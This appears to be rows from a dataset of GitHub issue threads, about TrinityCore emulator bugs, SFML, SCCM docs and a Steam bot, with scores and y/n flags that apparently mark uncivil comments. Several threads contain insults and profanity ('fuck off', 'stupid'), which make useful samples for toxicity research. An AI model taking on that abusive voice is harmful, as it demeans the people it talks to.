this is even still a discussion. I‚Äôm at a loss. I use custom aspect ratios with RA because I overscan some games that scale to 1120 on the y axis. Switching it to core provided didn‚Äôt change what was going on with the reported width/height and rotation, as far as I could tell. Anyway, the issue in FBA was fixed yesterday so I think this issue can be closed; rotation behavior appears to be consistent, at least from the user‚Äôs perspective. The issue of how to best handle rotation is really a separate topic that probably warrants its own issue.  @friend ive already done the fix for 2003 and plus linked it and described the issue you are either stupid or argumentative or clueless about whats going on i think the latter )  @friend Let's please keep this respectful at the very least. That last line was unnecessary. ",105,70,700,0,0.5,592,22,y,
SCCMdocs/MicrosoftDocs/1249,0.230940974,MicrosoftDocs,SCCMdocs,WTF,1255,10,24,0,0,"I search ""sccm create static computer collection"", knowing that a device collection is a list of computers that is dynamically generated but I want to make a static list that does not automatically change. Result Microsoft.com -&gt; ""How to Create a Static Collection""   &lt;- Promising blah blah blah VBScript or C# code it yourself. ........what?! SCCM is painful enough with absolutely no logic in how it is designed or functions.  Why does the Documentation have to suck even worse then the product!?  Document Details ‚ö† Do not edit this section. It is required for docs.microsoft.com ‚ûü GitHub issue linking.  ID 19ae23b9-9a79-ce32-522b-e59697716bb3 Version Independent ID 83637444-e3ce-6c02-3617-d22842fb95b6 Content Create a Static Collection - Configuration Manager Content Source sccm/develop/core/clients/collections/how-to-create-a-static-collection.md Product configuration-manager GitHub Login @friend Microsoft Alias aaroncz   The Microsoft Open Source Code of Conduct, which outlines the expectations for community interactions in and around docs.microsoft.com, is designed to help ""provide a welcoming and inspiring community for all."" The content of this issue appears to be out of sync with the code of conduct. Thank you for closing it. ",0,0,63,0.5,0.5,53,4,y,
SFML/SFML/1556,0.19045795,SFML,SFML,Wow,1599,9,3,0.55,0,"And you removed my issue now, wow, good! Do you know what ? I'll try to set my framework without SFML because I see SFML is not a serious projet.   The issue was closed with a corresponding reason. This did not prevent you from commenting on why you think it should have been re-opened. You did not provide any information that would help anybody else in resolving the problem, if it was even caused by SFML. You disregarded the very text in the issue template that suggested asking on the forum first about any issues with the usage of SFML before opening an issue, which we prefer only contain confirmed bugs with appropriate information. The issue was not removed. Please familiarize yourself with the way GitHub works before making such claims. Threatening people in any way is not constructive and will not benefit anyone in any way. You are entitled to believe what you want to believe, but making blanket statements such as ""SFML is not a serious project"" on an open platform has a high chance to mislead people into believing it as a fact. As such, in the future please refrain from making such remarks. I have temporarily blocked you from the SFML organization for 7 days. Please take this time to calm down and reflect on what has just happened. If you have any comments regarding the handling of this issue, please either take it to the forum or contact the SFML team via other means. If, after you are unblocked, you intend to continue to post clearly non-constructive content, you will be permanently blocked from the SFML organization. This is your last warning.  Have a pleasant day. ",5,0,33,0.1,0.3,53,2,y,
SalienCheat/SteamDatabase/156,0.10237355,SteamDatabase,SalienCheat,Not being able to only choose zones on a specific planet ,1059,11,0,0.666666667,0,"why cant i set it to only choose zones from planet 18 or 19 so if i want a game only from planet 18 it will only use planet 18  Because you cannot do that.  @friend Why you can when do that in the game  i just want it so it only does planet 18  Because this is a bot that maximizes the XP you get. If you want to go manually to Planet 18 then you gotta turn off the bot and do it manually.  is there any fork of this project that allow me to do that @friend  I really want to do it on planet 18 and another planet when it comes i like does the whole script need to be rewritten to just use another planet ????  @friend can anybody do that please i really only want a game from planet 22 only can do i just change some lines of code and make it only use planet 22  why @friend  @friend already said why, stop asking.  BUT CANT YOU JUST CHANGE BESTPLANET IN THE CODE AND SET IT TO PLANET 22 @friend  Good job, then what do you want from us? Stop mentioning me.  @friend my only question is what i need to change it too for planet 22 !  Easy Write your own bot. ",5,0,21,0,0.333333333,67,6,y,
TrinityCore/TrinityCore/10510,0.11098393,TrinityCore,TrinityCore,[DB/SAI] Mystery of the Infinite (12470),4987,61,50,0,2,"The quest itself might work, but it is still not finished. 1 text fails to execute, even when forced by an in-game data set command.  The end data set text also doesn't execute, nor do the actions.  Mirror aura is lost on Future You's evade mode; the core is only set to allow a vehicle aura on evade, anything else will be wiped out, including the clone aura. I don't have much time to finish those things, so you can test it out if you want, and add suggestions.  Creature entry 27898 has EventAI scripts, but its AIName is not 'EventAI' - possible AI-mismatch? Creature entry 27900 has EventAI scripts, but its AIName is not 'EventAI' - possible AI-mismatch?  Nothing in my DB's, but if there really are any EAI's  Yup, there are!  Also first creature_text should be ""'Hey there,""  No, it's ""Hei there..."" that's sniff info. And it's also ""Future you"" an npc that is your clone from the future, which in terms explains why the text is ""Hei"", it's something usually a player would say.  Would be best to change it though, ""Hei"" does sound rather strange.  ""Future You whispers Hey there, &lt;name&gt;, don't be alarmed. It's me... you... from the future. I'm here to help.""  Now go for the redux part - Mystery of the Infinite, Redux plus one  Oh and look here  at 720p  I already changed it to ""Hey"", but I still have no idea why the sniff would show a ""Hei"", unless it was tampered by mistake. I'm not going to do redux until this one is finished.  Great work Kirk!... as always. I would like to state that the quest is fully completable now, but there are a few cosmetic bugs with it. Just a few notes, I apologize if you already know this.  First creature_text   Does not appear to me.  Future You's character model disappears after he whispers you. ""I can't believe I used to wear that"". You can still target him by typing /tar future, but his character model is gone. Although mobs still will attack him while he's invisible!  He does not talk to you after saying ""I can't believe I used to wear that."" I don't appreciate his sassy attitude very much. xD  Weapons do not appear on Future You. He fist punches everything.  Future You has a 'PvP' flag, I could be wrong, but I don't think he's supposed to be flagged for PvP.  Nozdormu does not appear after the quest is finished.   Keep up the good work!  The quest itself might work, but it is still not finished. 1 text fails to execute, even when forced by an in-game data set command. &lt;&lt;&lt;&lt;  Ok forget, this was nothing to do...  Updated the above post with new changes, every aforementioned issue should now be fixed; This including, the text that didn't show, the fail quest if the hourglass is destroyed, the despawn set when the quest is finished. The only real issue that remains (And this is core sided) is that all auras save for one excluded are wiped form the npc on evade, we must find a circumvention for this aura or simply add it as an exclusion in the core also. Currenty @friend is working on this, and will keep you posted. Test out the updated script, and tell me if there are issues. And also note, if the Future You npc ends combat it will evade and lose it's clone aura, this will automatically make the script not work for him anymore, and he won't execute any text lines, or any lines for that matter; keep him in combat to test the script at all times.  Quest does not complete now, even when Future You stays in combat the entire event. Future You's weapons are still not shown. Nozdormu still does not appear, but that probably won't be fixed until and update is released to keep Future You from disappearing out of combat. As the last two lines of creature_text are not displayed. Otherwise that, all creature_text is now working as long as Future You stays in combat.  Did you try cleaning client cache?  Uhm, the quest should complete just fine; Also, Nozdormu only appears if the quest status is completed, because that aura is in spell_area. The last two lines should also appear, no idea why they don't for you. Did you try copying the new script up there? It is updated.  Gah, such a stupid mistake. Thank you Chazy, I will be going to bed now. Quest now completes as long as Future You stays in combat. Nozdormu does appear at the end now along with the two creature_text lines. Weapons are still not displayed on Future You.  That's a minor cosmetic bug, I can't deal with it now; what I really want done is to prevent the clone aura being removed. I'm glad everything else is fine now. Also, for me, a weapon and a shield appear on Future You, but not the ones I own, rather totally different ones.  Okay, aura issue fixed in faa2ec9 Please compile with that commit and re-try the quest now. Only thing left to fix now is getting the clone to not bounce off data sets. If he doesn't receive them, he won't execute script.  @friend  Sorry but i have a question to your commit. You set smart_ai for 27896 (NPC_AI) and 27897(NPC_ID) but you dont insert a smart_script for this id's. ",26,0,236,0,0,158,8,n,
TrinityCore/TrinityCore/11476,0.065910365,TrinityCore,TrinityCore,Quest NPC Missing Quest 3.3.5,9799,139,242,0,2,"Magistrix Landra Dawnstrider is missing the quest 9395 (Saltheril's Haven) WoWHead.com info say     Level 9     Requires level 8     Side Horde     Start Magistrix Landra Dawnstrider     End Lord Saltheril     Sharable     Difficulty 8  12  15     Added in patch 4.0.1 &lt; This is incorrect as it was added way before 4.0.1 I know because I played official since Vanilla and I made many Blood Elves even in WotLK 3.3.5. using Zygor Quest Guide takes you to her to accept quest but quest is not in log. Zygor Quest Guide follows the Vanilla Questing to a tee and I made sure I had the 3.3.5 Version of the quests guides so no mishaps like this happen Series  Saltheril's Haven The Party Never Ends  Checking in the Database (creature_queststarter) page 4 the quest id 9395 is linked with the correct quest entity 16210 (Magistrix Landra Dawnstrider) so why would the quest not populate and show up in-game? Level requirements were met faction requirements also met and the pre-quest 9255 (Research Notes) was completed which should make quest 9395 Available immediately. manually adding the quest does properly accept the quest. .quest add 9395  It may be in the disables table, if a manual add isn't working for it.  no manually adding it does work which is what confuses me on why it's not available when the appropriate requirements are met  Ok. Then it's simply not in creature_queststarter table. With the manual add, can it be properly handed-in? If not, then you need to add the appropriate creature_questender table entry, too.  it is in that table ""Checking in the Database (creature_queststarter) page 4 the quest id 9395 is linked with the correct quest entity 16210 (Magistrix Landra Dawnstrider) "" and yes it can be handed in correctly which is why I'm baffled by this. and prequest 9255 is properly linked in both tables  Check the quest_template table and verify the RequiredRaces column.  says 650 is that correct I forget where to check that it's available to all HORDE not just bloodelves.  Look for wrong conditions.  untaught how do i do that?    Have no time right now but when I get back I'll look at the issue.  650 is wrong. It should be 690 for WotLK or before and 946 for Cata and later (added goblin in Cata).  OK thanks untaught, i'll check that section now Kylroi and post if that fixes it  No conditions for that quest. It must be the RequiredRaces column set wrong.  yes the required race is 690 I guess I miss read it when I thought  9067    2   9   7   0   3430    0   0   0   0   690 0   0   0   0   0   0   0   0   0   0   9395    0   0   0   5   900 480 0   0   0   0   0   0   0   0   0   136 0   0   0   0   0   23500   0   0   0   1   0   0   0   0   0   0   0   0   0   0   0   0   0   0   0   911 0   0   0   0   5   0   0   0   0   0   0   0   0   0   0   0   0   0   The Party Never Ends    Acquire a bottle of Suntouched Special Reserve, Springpaw Appetizers and a Bundle of Fireworks, and return them to Lord Saltheril at Saltheril's Haven in Eversong Woods.   I like to throw parties... just a little something to celebrate the magnificence that is Quel'Thalas!$B$BBut, I'm in a bit of a bind.  I need you to gather up more party supplies.$B$BFrom Vinemaster Suntouched at the Silvermoon City inn, bring me a bottle of Suntouched Special Reserve.  From Zalene Firstlight at Farstrider Retreat acquire more of those delicious Springpaw Appetizers.  And you can pick up my delivery of fireworks from Halis Dawnstrider at Fairbreeze Village.$B$BBe quick about it!        You're quite the energetic young $gmanwoman;, aren't you?$B$BThis all looks very adequate. You certainly deserve compensation for gathering up all of this for me, and something a little extra I think.$B$BOh, I almost forgot, here's an invitation to the party. And, $c, next time that you drop in make sure to dress up in something a little more... festive.   Didn't I just send you out to gather up more party supplies?  Was that you?  Oh, I can't be expected to remember everyone's face, now can I?  I meet so many... interesting people.$B$BWhat is it that you want?    Return to Lord Saltheril at Saltheril's Haven in Eversong Woods.    0   0   0   0   0   0   0   0   0   0   0   0   0   0   0   0   22775   22776   22777   0   0   0   1   1   1   0   0   0   1                   0   0   0   0   0   0   0   0   0   1   0   0   0   0   0   0   0   0   12340  that's a big mess ugh lol  Indeed. Is that the quest_template? If so, they really changed that structure between 3.3.5a and 4.3.4.  Here's the 4.3.4 listing  yes that's the quest template for the issue quest  So, 9067 lists 9395 as the next quest, and 9395 lists 9067 as the previous quest. However, the core doesn't give you 9395 when you complete 9067?  exactly and the level requirement is level 8 min and I was level 10 and still was not available... it's a odd bug probably something very minute could even be on my end but for the love I just cannot figure it out.  Well, yes, it's your end. You're using WoW emulation instead of a retail server. heh Seriously, though, it's sounding like a bug that was introduced in some of the code changes that have been going on. All I know it that when they try to merge some of those master branch changes, they royally mess up the 4.3.4 branch (current commit revision won't even compile all the way due to an incomplete merge, but that will likely be fixed in a day or so).  Could you post the SQL export of the 2 quests (similar to the way I posted the 4.3.4 version)? Which SQL client do you use?  i use navicat for windows to browse the database but for uploaded all the sql files i used ""mysql -u username -p  DATA-BASE-NAME &lt; data.sql "" from my linux console. I know everyone says ""don't use navicat"" but i've never had problems with it since mango's or trinity when i have done it locally but I didn't bother importing the dump's over the net like i said i used that bash command to upload them via linux directly &lt;code&gt; 9067;2;9;7;0;3430;0;0;0;0;690;0;0;0;0;0;0;0;0;0;0;9395;0;0;0;5;900;480;0;0;0;0;0;0;0;0;0;136;0;0;0;0;0;23500;0;0;0;1;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;911;0;0;0;0;5;0;0;0;0;0;0;0;0;0;0;0;0;0;The Party Never Ends;Acquire a bottle of Suntouched Special Reserve, Springpaw Appetizers and a Bundle of Fireworks, and return them to Lord Saltheril at Saltheril's Haven in Eversong Woods.;I like to throw parties... just a little something to celebrate the magnificence that is Quel'Thalas!$B$BBut, I'm in a bit of a bind.  I need you to gather up more party supplies.$B$BFrom Vinemaster Suntouched at the Silvermoon City inn, bring me a bottle of Suntouched Special Reserve.  From Zalene Firstlight at Farstrider Retreat acquire more of those delicious Springpaw Appetizers.  And you can pick up my delivery of fireworks from Halis Dawnstrider at Fairbreeze Village.$B$BBe quick about it!;;You're quite the energetic young $gmanwoman;, aren't you?$B$BThis all looks very adequate. You certainly deserve compensation for gathering up all of this for me, and something a little extra I think.$B$BOh, I almost forgot, here's an invitation to the party. And, $c, next time that you drop in make sure to dress up in something a little more... festive.;Didn't I just send you out to gather up more party supplies?  Was that you?  Oh, I can't be expected to remember everyone's face, now can I?  I meet so many... interesting people.$B$BWhat is it that you want?;Return to Lord Saltheril at Saltheril's Haven in Eversong Woods.;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;22775;22776;22777;0;0;0;1;1;1;0;0;0;1;;;;;0;0;0;0;0;0;0;0;0;1;0;0;0;0;0;0;0;0;12340 &lt;code&gt; 9395;2;9;8;0;3430;0;0;0;0;690;0;0;0;0;0;0;0;0;0;0;9255;0;0;9067;1;0;60;0;0;0;0;0;0;0;0;0;136;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;911;0;0;0;0;1;0;0;0;0;0;0;0;0;0;0;0;0;0;Saltheril's Haven;Speak with Lord Saltheril at Saltheril's Haven in Eversong Woods.;I swear that I'm going to fireball someone if I get one more request from Lord Saltheril concerning supplies for his party!  Do I look like a party planner?!  Between you and me, that fool and his sycophants are living in denial that we're under attack here!$B$BSome of us are actually busy with, oh, I don't know, defending what's left of Quel'Thalas!  $C, would you please head over to Saltheril's Haven and see if you can shut him up?  It's just down the road to the west.;;Ah, good of Magistrix Dawnstrider to finally respond to my simple requests.  I should take up the matter of her attitude with the regent lord in Silvermoon. She's quite rude!$B$BNothing for you to concern yourself with though. Now that you're here, maybe I'll finally be able to get those party supplies that I've been waiting for? ;;;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;1;;;;;0;0;0;0;0;0;0;0;0;1;0;0;0;0;0;0;0;0;12340  Quest 2 is the one that does not trigger after quest 1 is complete with all requirements met but quest 3 does trigger when manually adding quest 2  Research Notes is quest 1 yes  Interestingly, that isn't listed as part of the chain, not on Wowhead or in the 4.3.4 database. I wonder if that's the error going on.  I can no longer trust wow head because wowhead is claiming this quest only existed since 4.0.1 but this quest is from the launch of BC as part of the blood elf starter quests. but it could be the issue  For future reference, you can use something like  to get an SQL output. There may be other options to add, to strip out the unnecessary information, or just manually copy/paste the appropriate parts of the output.  oh yeah? thanks yeah I'm not very fluent in mysql query building  Everything works fine and the first quest in the chain is  !!!  hmm i'll try again i'll make a new character and start it all over again  I did forget to post my build though TrinityCore rev. 939a25346b57 TDB 335.52 ",29,0,618,0,0,356,33,n,
TrinityCore/TrinityCore/1225,0.064220992,TrinityCore,TrinityCore,Summary  Buff- and Aura-Stacking,3549,15,10,0,12,"'''Armor''' Provided by Paladin (Devotion Aura), Shaman (Stoneskin Totem) ''Stacks'' '''5% Melee Critical Strike Chance''' Provided by Warrior (Rampage), Druid (Leader of the Pack) ''Stacks'' '''5% Spell Critical Strike Chance''' Provided by Druid (Moonkin Form), Shaman (Elemental Oath) ''Stack partially (but only for the Moonkin, who provides the aura)'' '''10% Attack Power''' Provided by DK (Abomination's Might), Hunter (Trueshot Aura), Shaman (Unleashed Rage) ''Stack partially (the same thing like 5% Spell-Crit, if there are for example 2 Hunters, the one who activate Trueshot Aura later get's 20% Attack Power)'' '''Mp5''' Provided by Shaman (Mana Spring Totem), Paladin (Blessing of Wisdom) ''Stacks'' '''Spell Power''' Provided by Warlock (Demonic Pact), Shaman (Totem of Wrath), Shaman (Flametongue Totem) ''Stack partially (Demonic Pact and Totem of Wrath/Flametongue Totem stacks, Totem of Wrath and Flametongue Totem does not stack)'' '''Healthpoints''' Provided by Warrior (Commanding Shout), Warlock (Blood Pact) ''Stacks'' '''Stats Multiplier''' Provided by Paladin (Blessing of King), Paladin (Blessing of Sanctuary) ''Stacks''  '''3% Damage''' Provided by Paladin (Sanctified Retribution), Mage (Arcane Empowerement), Hunter (Ferocious Inspiration) ''Does not Stack as far as i know, but not 100% sure'' '''10% Physical Damage Incoming''' Provided by Shaman (Ancestral Healing), Priest (Inspiration) ''Not tested yet'' '''3% Damage Incoming''' Provided by Paladin (Blessing of Sanctuary), Priest (Renewed Hope), Warrior (Vigiliance) ''Not tested yet'' '''5% Spell Haste''' Provided by Shaman (Wrath of Air Totem), Druid (Improved Moonkin Form) ''Not tested yet'' The rest work as intended as far as i know. I hope i can test the untested things soon, so i can update them.  Author mark07 As you can read [ here], it's right that the armor bonus from Devotion Aura stacks with Stoneskin Totem.  Author kbinside half of things you write should stack.  Author tehacy Please check your your Informations before writting such shit! When you're the opinion that someone made a fault, prove or at least explain why its wrong like mark07 (btw thanks for this information), but with this attitude please go trolling somewhere else. 5%crit shouldnt stack (physical and spell) -&gt;  shouldnt stack -&gt;  shouldnt stack -&gt;  shouldnt stack -&gt;  Mulitplier shouldnt stack -&gt;  to explain it These two Buffs should both be able to stack on a Raidmember but because of the partially different buffs they offer, but the Strength and Stamina part shouldnt stack Spell Power shouldnt stack -&gt;  (only discribed, that Flametongue and Wrath shouldnt stack), but  you can read this Demonic Pact does not stack with an elemental Shaman's Totem of Wrath 3%! Haste (Not 5% - shame on me - wasnt focused enough) shouldnt stack -&gt;  Damage shouldnt stack -&gt;  Physical Damage Incoming shouldnt stack -&gt;  Damage Incoming shouldnt stack -&gt;  damage reduction from Blessing of Sanctuary, Renewed Hope and Vigilance does not stack. The buffs stack, because they have other effects - mana replenishment, threat transfer, etc. - but the 3% damage reduction buffs do not stack. It's this way for pretty much every buff buffs that do exactly the same thing as each other, tend not to stack. Exception Stoneskin totem &amp; devo aura."") So the same thing as Blessing of Sanctuary and Kings. The Armor-Buff was my fault. I didnt checked it and trusted a raidmember.  It would be very nice, if u get this aura stacking fixed.  Updated at  #7667 ",7,0,304,0,0,208,2,y,
TrinityCore/TrinityCore/14120,0.047293532,TrinityCore,TrinityCore,Pet Pathing & Pet LoS,2714,25,15,0,2,"I couldn't find any other issue regarding this. I suppose this is a well known issue/exploit but I'll explain it briefly  Any Pet which can be commanded to attack (ie any warlock pet, hunter pet, frost mage pet,... etc) will go through walls and solid gobjects, mainly doors, to attack its objective.  This offers exploit opportunities to players such as starting combat with locked bosses and avoid doing the whole instance (ie Ymiron at Utgarde Pinnacle). hash c5dac48436c8a00d40640af9aecaaa71d549135a Using mmaps.  Walls or doors ? Because doors are ingame gameobjects spawned at runtime, walls are already present in client files and handled by MMAPs  then it's a know old issue, mmaps don't take into account any dynamically spawned gameobject  well I just wanted to have it on an open issue ^^  it has been a known issue for 2 years at least and it's going to be like that for 2 more years too  It's not an attitude, it's the simple consequence of the limitations of recastnavigation. We already worked on this issue months ago, people before us tried too but no steps forward have been made (and I'm actually the only dev who fixed an issue in recast and got his PR accepted). You could study how recastnavigation works and see with your own eyes what l'm talking about.  If anyone would like to mess with recast, here's an idea  1 year passed, 1 left to go  Not high anymore, with the new boundaries system from Treeston you can't pull ingvar anymore.  2 years passed! ding!  @friend in IRC, you mentioned that there are 2 types of game objects  ""static game objects"" such as doors. They are created at exactly the same place each time they are spawned in the world. In other words, their location and geometry is known at build time. And then ""dynamic game objects"" which can be spawned on a new and unknown location each time they are loaded. Their location and geometry is only known at runtime.  The support of what I call ""dynamic game objects"" in the MMAPs would be a really cool feature. But is it even blizz-like? Are there cases where game objects are spawned at a new location on each game session? I don't think such feature is even possible considering the constraint of performance and memory space that TC has. If we were to only implement support of ""static"" game objects, it would be much simpler. Won't be easy game but I got my little idea on how to do it.  I think we can implement features as incremental iterations, so handling doors would be nice and it will help understand how recast and detour work. We can worry about dynamic gameobjects later.  @friend This is still an issue on  yes, mmaps, vmaps and all that stuff is enabled. not sure why it was closed as it never got fixed. ",14,3,80,0,0,50,5,n,
TrinityCore/TrinityCore/15489,0.119825833,TrinityCore,TrinityCore,6x Hunter and Troll Sham Issues #59eff3fe,1983,18,4,0,3,"Level 1 hunter, cannot equip weapons Troll Shaman Quest Proving Pit  to the Darkspear Jailor and nothing happens, quest is no initiated in the pit therefore it cannot be completed.  This issue is not considered valid because of the following reasons  No proper commit hash (revision)  Please read  . Thanks.  TBD 602 Rev 59eff3f This bot is rediculous lol  don't post multiple issues on one ticket. search before posting tickets. (duplicate)  @friend ; the bot is not ridiculous, it points out that the first post of your issue is not properly written. If you don't follow the TC guidelines on how to post an issue, this is one of the consequences.  its closed with Aokromes making his usual attitude and I am holier than though apprach, let it be that way. TC has been rushed and devs dont give a shit about us trying to learn  Well, that is what I used to feel myself, especially regarding my own issues when posting a year ago. Seeing his comment today, from an outsider's viewpoint, his comment is neutral, short and to the point.  well Ive searched for the issues that I have found on my 6x server, no answers no fixes, nothing yet I get told to search or go to this thread or that thread and yep, already been there and nope it doesnt fix a thing. How about they just own up to the fact that a start area is bugged or a a class is bugged and fix it rather than trolling forums or github trashing the novices. Tis the trouble with online communites, those who think that they are god and those who genuinely want to learn. I will wait patiently until 6x gets a lot more mature before I even try to play with it again.  Your issues (2 issues) in the first post are duplicates. Example search  issues you can follow to see the progression on issue fixes [Quest] Proving Pit #11706  Fixed equip ranged weapons (Guns, throwns etc..) #14493  Hunter bug 6.x #15296  ok finally got it so hunters can equip, wondering why it doesnt give the hunter a cross bow or  a bow on initial load ",5,0,52,0,0,42,0,n,
TrinityCore/TrinityCore/16280,0.472920053,TrinityCore,TrinityCore,[3.3.5] Trial of The Crusader - Event Problem,1221,9,9,0,1,"Branch  3.3.5 Commit  0316dff24530da83ef3466500ee8bd4e1af548ba When you are enter on trial of the crusader then start the event .  gormok the impaler comes inside the ring and stay ... nothing happened and he is not selectable and doesn't moving kill him with die and the snakes are same .  Dreadscale come in and the other one does not come up from the ground . before this i'm on  347373264b4ca5046af5c23378117e6ddb66504d  and everything works fine .  linking these to reference what you are talking about with the disables.  @friend   it's already disabled in db , i'v encountered another issue with new commits .  Like I said, I was just referencing what you were talking about.  Very likely bug on boundaries commit.  Started with 2da458c56d024aac04468ce2af454a83ad790bf6 Tested with the previous commit and all ok.  @friend since when exactly does Sindragosa have anything to do with Trial of The Crusader?  @friend realy stupid?This problem is boundaries system.  @friend it would be great if you could speak/write in a slightly more moderate tone. Those phrases you use aren't really appropriate for an issue tracker. I'm not sure how many people are willing to help you with such an attitude. Just my 2 cents... ",2,0,36,0,0,18,2,y,
TrinityCore/TrinityCore/17506,0.64103799,TrinityCore,TrinityCore,[6.x] Encounter Progress Panel,6874,59,28,0,0,"Description Hello TrinityCore devs. I have noticed that the boss encounter progress panel is not working. I know this is only a cosmetic thing; and TC is appearing to be focused on playability. But many of us are here to study and to learn about how, maybe, a real MMO will be structured back-end. It is nice that a spell works, but it doesn't help with the model of TrinityCore (an educational project). I would really love to learn more from you about this system. Current behaviour Tell us what happens When you enter a dungeon from the instance portal, you do not see the encounter progress panel on the right of the screen. Expected behaviour Tell us what should happen instead On retail, when entering the instance, we will see something like this  Steps to reproduce the problem  Make any character Teleport to the entrance of any dungeon Enter the dungeon  Branch(es) 3.3.5 / 6.x (Select the branch(es) affected by this issue)  6.x TC hash/commit 77f980035a43a9156c22130042d1fb6597139ee0 TDB version 6.04 Operating system Windows 10  I am sure this ticket is duplicate, but can't find original one.  I did search for an open ticket too, but did not find one so I created this.  NO! PLEASE CLOSE! why tc should doing that while all pservers already having this? for make difficulty with merge? better for work on quests and spells which not pservers having. for improving state of private conditions source.  @friend well this is not only a cosmetic. This makes players to get more bonuses like Experience and Gold.. Thats a huge thing to get fixed  )  @friend TC has no business with private servers so if TC implements scenarios on their own they don't have to care about their servers. (Scenarios is the point that is being asked for here.)  Wall of text warning I'm working on implementing Scenarios for TrinityCore at the moment, but have been asked to put it on hold for a while, while I spend some time to update and push some uncommited PvE encounter scripts for Dragon Soul / Terrace of Endless Spring and Heart of Fear. Main issue with the scenario system I'm currently working on is the missing information about Criteria Tree operator flags which the scenario system, and achievement system build upon. Basically the operator flags help determine whether or not a criteria has been fulfilled (which Scenarios use to track progress). We currently only know 2 operator flags for processing criteria progresses, and there appears to be at least 2 more that are currently unknown. Basically what doesn't work is if the scenario asks you to kill 30 creatures in the instance, then the criterias behind it might look something like this Description Kill 30 enemies (CriteriaTreeId 123) Amount to complete criteria is determined from the CriteriaTreeId, and that amount is 30 (30 enemies) CriteriaIds to be fullfilled to complete CriteriaTreeId 123 are the following 50,  51, 52. Criteria 50 corresponds to killing creature with entry 1001, 15 times. Criteria 51 corresponds to killing creature with entry 1002, 15 times. Criteria 52 corresponds to killing creature with entry 1005, 15 times. The currently criteria system will then only fulfill the criteriatree, if all criterias are complete. And they  currently  require you to kill exactly 15 of creature entry 1001, 15 of creature entry 1002, and 15 of creature entry 1005. Which is a total of 45, and a strict requirement to kill 15 of a certain creature, when the CriteriaTree asked for 30, from any of those criterias listed. This is the behavior that I've observed so far, but I could use some help from Shauren to verify this and see if he has any idea of what the currently unknown operator flags might do. There's also another problem with the criteria UI, and I believe it's related to a loading screen issue currently present in TrinityCore. When you get a loading screen, you bar will fill up to indicate loading progress, just like retail. However when it reaches 100% on trinitycore, the loading bar disappears after a small delay, without removing the loading screen itself. The loading screen eventually goes away but it has already caused an impact in displaying the scenario UI, whos opcode has been sent properly. Resending the scenario UI opcode whilst playing will correctly show the UI. These 2 problems are currently impeding the progress of pushing this feature, so if you have any knowledge about helping/fixing this, please contact me. The 2 issues recapped  Unknown CriteriaTree.db2 operator flags TrinityCore Loading screen issue (I might be very wrong about this being the root cause for the scenario UI not showing, if sent during the loading screen)   So I was wrong, this is more than a cosmetic issue. I am now even more intrigued about this Scenario system. Maybe you can push a PR to TC and the community can improve / complete the system? I'm very interested to look at your work.  @friend Loading screens should have been fixed 3 weeks ago - 2fe6fc63d79655a96ee2135a6b380ce353729088  @friend Great! Sorry for refering to outdated rev.  @friend better to not make pr. why to do pr of scinario to tc? all pserver have already this. only to making merge conflict? for making battle with git?! open sources dose not need it! do the encounter script, the ""Dragon Soul / Terrace of Endless Spring and Heart of Fear"" is lot better for you. pls. many respect to tc devs, but pls close issue.  @friend please kindly fuck off and mind your own server with this attitude. While at it please also don't use TrinityCore as you clearly already have everything fixed, don't need anything here except just leeching things you are unable to fix yourself.  @friend you know a simple thank you goes a long way? It shows you are nothing more than a Leech! Who the ---- do you think you are dictating what and what the opensource needs? As for your request to get something done... How about placing a bounty on it so the person who caters to you actually gains something for providing you what you want since you cant provide fixes. If you are running a pserver which mind you is NOT supported by TC or any other core development community this means you are gaining from it in some way or you would not be doing it how about throwing the dev team a Monitory tip for their efforts. Clearly you are too incompetent. Or hey wait even better.. Learn to code and move away from TrinityCore. WAIT A F--ken moment here So you have that working and yet you didn't provide a solution or p/r? You have no one to blame but yourself for merge conflicts because you didn't offer a p/r  Here's your tissue mate. I Second Shauren in his statement. @friend Nice response! I could not say it any better )  @ Trinity Development Team and Community You guys rock and Don't let people like this discourage you. People like ViktorIvanenko Hold very little value and only acts for their own gain not anyone else. ",18,0,184,0,0,200,16,y,
TrinityCore/TrinityCore/19440,0.073326323,TrinityCore,TrinityCore,"[3.3.5] Spell Reflect vs Channel Spells, multiple reflections",2016,13,9,0,2,"Description Spell Reflect is reflecting multiple ""ticks"" of channel spells like Arcane Missiles spell 42846 = [Arcane Missiles] spell 23920 = [Spell Reflection] Expected behaviour Spell Reflect should reflect the first ""tick"" only Steps to reproduce the problem  Put a mage and warrior in duel With talent  [Missile Barrage] (spellid=44401) active, use Arcane Missiles in a warrior with Spell Reflect active You should receive back 2 Missiles, instead 1  Is more easy reproduce if mage has a good hast rating Branch(es) 3.3.5 TC rev. hash/commit  21b2042840e05ebeba365c54d47c07c13fde123f  i dont think so, before your spells rework, all missiles hit warrior and 0 was reflected xd  Is improved spell reflection speced during this?  Imp. spell reflection only affects party members   three first waves of arcane missiles will get reflected, and the next ones you will have to take. the drain life cast will just simply cancel, and he will have to use another global cooldown to cast it again. the drain soul cast will simply cancel, and he will have to use another global cooldown to cast it again. the mind flay cast will simply cancel, and he will have to use another global cooldown to cast it again.   Bad issue tagged in commit  @friend you said Expected behaviour Spell Reflection should reflect the first ""tick"" only Don't be stupid, @friend Spell Reflection should reflect all of the missiles. Have you even even researched this?  No need to insult other users, if you think something is wrong just state it.  Maybe if he researched it, I wouldn't have insulted him.  Ok, bad attitude even warned, next time you will be blocked.   Btw, i will try some friend to check it on retail, i'm pretty sure it only should reflect the first ""tick"" I remember when i'm doing arena close to pre patch (wotlk-&gt;cata) and in middle of MOP my penance reflect only first tick. With more time i will search more videos too )  yeah i cant find videos to to sustain my point... So updated issue description. Thanks lineagedr. ",17,1,69,0,0,49,2,y,
TrinityCore/TrinityCore/20683,0.13774121,TrinityCore,TrinityCore,DB/SAI: Initiate Emeline and Initiate Colin,194,1,3,0,0,Description Initiate Emeline and Initiate Colin should talk every once in a while. Branch(es) both. TC rev. hash/commit 7dc97c035350f9505a9fba0b8ec2d2037044e586 TDB version 335.63 Suggested fix ,1,0,7,0,0,12,0,n,
